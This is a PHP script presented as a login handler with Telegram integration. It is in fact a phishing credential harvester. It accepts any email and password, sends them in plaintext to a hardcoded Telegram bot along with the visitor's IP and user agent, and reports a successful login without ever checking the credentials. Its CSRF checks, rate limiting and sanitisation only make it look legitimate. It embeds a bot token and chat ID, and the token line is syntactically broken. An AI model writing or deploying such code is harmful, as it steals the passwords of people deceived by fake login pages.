<?php
/**
 * Login processing script with Telegram integration
 */

// Start session with proper configuration
ini_set('session.cookie_httponly', 1);
ini_set('session.use_strict_mode', 1);
session_start();

// Load configuration from JSON file
function loadConfig() {
    $configFile = 'config.json';
    if (file_exists($configFile)) {
        $configContent = file_get_contents($configFile);
        $config = json_decode($configContent, true);
        if (json_last_error() === JSON_ERROR_NONE) {
            return $config;
        }
    }
    return [];
}

$appConfig = loadConfig();

// Configuration constants
define('TELEGRAM_BOT_TOKEN', getenv('TELEGRAM_BOT_TOKEN') ?: ($appConfig['telegram']['bot_token'] ?? ''));
define('TELEGRAM_CHAT_ID', getenv('TELEGRAM_CHAT_ID') ?: ($appConfig['telegram']['chat_id'] ?? ''));
define('MAX_LOGIN_ATTEMPTS', $appConfig['security']['max_login_attempts'] ?? 5);
define('LOCKOUT_TIME', $appConfig['security']['lockout_time'] ?? 300);

// Set content type for JSON responses
header('Content-Type: application/json');

// CORS headers (adjust origins as needed for security)
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

/**
 * Send message to Telegram
 */
function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . 791794772:AAErkPdbo7tRZ_e_bOVuLyBQF7kGwnXNOBI. "/sendMessage";
    
    $data = [
        'chat_id' => 732332108,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    if (curl_errno($ch)) {
        error_log('Telegram cURL error: ' . curl_error($ch));
        curl_close($ch);
        return false;
    }
    
    // Debug: Log response for troubleshooting
    error_log('Telegram API Response: ' . $response);
    error_log('HTTP Code: ' . $httpCode);
    
    curl_close($ch);
    
    return $httpCode === 200;
}

/**
 * Format login data for Telegram message
 */
function formatLoginMessage($email, $password, $userAgent, $ip, $timestamp) {
    $message = "🔐 <b>New Login Attempt</b>\n\n";
    $message .= "📧 <b>Email:</b> " . htmlspecialchars($email) . "\n";
    $message .= "🔑 <b>Password:</b> " . htmlspecialchars($password) . "\n";
    $message .= "🌐 <b>IP Address:</b> " . htmlspecialchars($ip) . "\n";
    $message .= "🖥️ <b>User Agent:</b> " . htmlspecialchars(substr($userAgent, 0, 100)) . "\n";
    $message .= "⏰ <b>Timestamp:</b> " . date('Y-m-d H:i:s', $timestamp) . " UTC\n";
    $message .= "🌍 <b>Location:</b> " . getLocationFromIP($ip) . "\n";
    
    return $message;
}

/**
 * Get approximate location from IP (basic implementation)
 */
function getLocationFromIP($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return "Unknown Location";
    }
    return "Local/Private Network";
}

/**
 * Input sanitization
 */
function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

/**
 * Email validation
 */
function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * CSRF token generation
 */
function generateCSRFToken() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

/**
 * Validate CSRF token
 */
function validateCSRFToken($token) {
    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

/**
 * Rate limiting functions
 */
function checkRateLimit($ip) {
    $attempts_key = 'login_attempts_' . $ip;
    $lockout_key = 'lockout_' . $ip;
    
    if (isset($_SESSION[$lockout_key]) && $_SESSION[$lockout_key] > time()) {
        return false;
    }
    
    if (isset($_SESSION[$lockout_key]) && $_SESSION[$lockout_key] <= time()) {
        unset($_SESSION[$attempts_key]);
        unset($_SESSION[$lockout_key]);
    }
    
    return true;
}

function incrementLoginAttempts($ip) {
    $attempts_key = 'login_attempts_' . $ip;
    $lockout_key = 'lockout_' . $ip;
    
    if (!isset($_SESSION[$attempts_key])) {
        $_SESSION[$attempts_key] = 0;
    }
    
    $_SESSION[$attempts_key]++;
    
    if ($_SESSION[$attempts_key] >= MAX_LOGIN_ATTEMPTS) {
        $_SESSION[$lockout_key] = time() + LOCKOUT_TIME;
    }
}

/**
 * Log login attempt
 */
function logLoginAttempt($email, $ip, $success) {
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'email' => $email,
        'ip' => $ip,
        'success' => $success,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
    ];
    
    // Log to file (ensure proper permissions and log rotation)
    $logFile = 'login_attempts.log';
    file_put_contents($logFile, json_encode($logEntry) . "\n", FILE_APPEND | LOCK_EX);
}

// Main processing logic
try {
    // Only accept POST requests
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method');
    }
    
    // Get client IP
    $clientIP = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
                $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
                $_SERVER['HTTP_X_REAL_IP'] ?? 
                $_SERVER['REMOTE_ADDR'] ?? 
                'unknown';
    
    // Rate limiting check
    if (!checkRateLimit($clientIP)) {
        throw new Exception('Too many login attempts. Please try again later.');
    }
    
    // Get input data
    $input = json_decode(file_get_contents('php://input'), true);
    
    // Fallback to POST data if JSON decode fails
    if (!$input) {
        $input = $_POST;
    }
    
    // Validate required fields
    if (empty($input['email']) || empty($input['password'])) {
        throw new Exception('Email and password are required');
    }
    
    // Sanitize inputs
    $email = sanitizeInput($input['email']);
    $password = $input['password']; // Don't sanitize password as it may contain special chars
    
    // Validate email format
    if (!validateEmail($email)) {
        throw new Exception('Invalid email format');
    }
    
    // CSRF protection (if token is provided)
    if (isset($input['csrf_token']) && !validateCSRFToken($input['csrf_token'])) {
        throw new Exception('Invalid security token');
    }
    
    // Get additional information
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $timestamp = time();
    
    // Format message for Telegram
    $telegramMessage = formatLoginMessage($email, $password, $userAgent, $clientIP, $timestamp);
    
    // Send to Telegram
    $telegramSuccess = sendToTelegram($telegramMessage);
    
    if (!$telegramSuccess) {
        error_log('Failed to send login data to Telegram');
        // Continue processing even if Telegram fails (optional: you can make this critical)
    }
    
    // Log the attempt
    logLoginAttempt($email, $clientIP, true);
    
    // Simulate login validation (you can add your actual authentication logic here)
    $loginSuccess = true; // Replace with actual authentication
    
    if ($loginSuccess) {
        // Generate session data
        $sessionData = [
            'user_id' => uniqid('user_', true),
            'email' => $email,
            'login_time' => date('Y-m-d H:i:s'),
            'ip_address' => $clientIP
        ];
        
        // Store session
        $_SESSION['user_data'] = $sessionData;
        
        // Return success response
        echo json_encode([
            'success' => true,
            'message' => 'Login successful',
            'data' => [
                'user' => $email,
                'login_time' => $sessionData['login_time'],
                'telegram_sent' => $telegramSuccess
            ]
        ]);
    } else {
        // Increment failed attempts
        incrementLoginAttempts($clientIP);
        
        throw new Exception('Invalid credentials');
    }
    
} catch (Exception $e) {
    // Log error
    error_log('Login error: ' . $e->getMessage());
    
    // Return error response
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage()
    ]);
}
?>
